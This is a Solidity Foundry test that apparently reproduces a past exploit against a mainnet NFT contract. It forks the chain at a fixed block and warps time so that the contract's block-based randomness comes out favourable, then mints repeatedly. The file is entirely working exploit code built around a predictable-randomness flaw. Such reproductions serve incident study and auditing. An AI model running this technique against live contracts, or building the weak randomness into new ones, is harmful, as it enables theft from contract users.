// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.13;

import "forge-std/Test.sol";

/*
    Attacker: 0x3392c91403f09ad3b7e7243dbd4441436c7f443c
    Attack tx: https://etherscan.io/tx/0x804ff3801542bff435a5d733f4d8a93a535d73d0de0f843fd979756a7eab26af
    poc refers to: https://github.com/0xNezha/luckyHack
*/

interface NFT {
    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract luckyHack is Test {
    event Log(string);

    address owner = address(this);
    address nftAddress = 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967;

    function setUp() public {
        vm.createSelectFork("mainnet", 15_403_430); // fork mainnet block number 15403430
        vm.deal(address(this), 3 ether);
        vm.deal(address(nftAddress), 5 ether);
    }

    function getRandom() public view returns (uint256) {
        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {
            return 0;
        } else {
            return 1;
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function testExploit() public {
        vm.warp(1_661_351_167);
        console.log("getRandom", getRandom());

        uint256 amount = 10;

        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {
            revert("Not lucky");
        }
        bytes memory data = abi.encodeWithSignature("publicMint()");

        for (uint256 i = 0; i < amount; ++i) {
            (bool status,) = address(nftAddress).call{value: 0.01 ether}(data);
            if (!status) {
                revert("error");
            } else {
                emit Log("success");
            }
        }

        console.log("NFT we got:", NFT(nftAddress).balanceOf(address(this)));
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
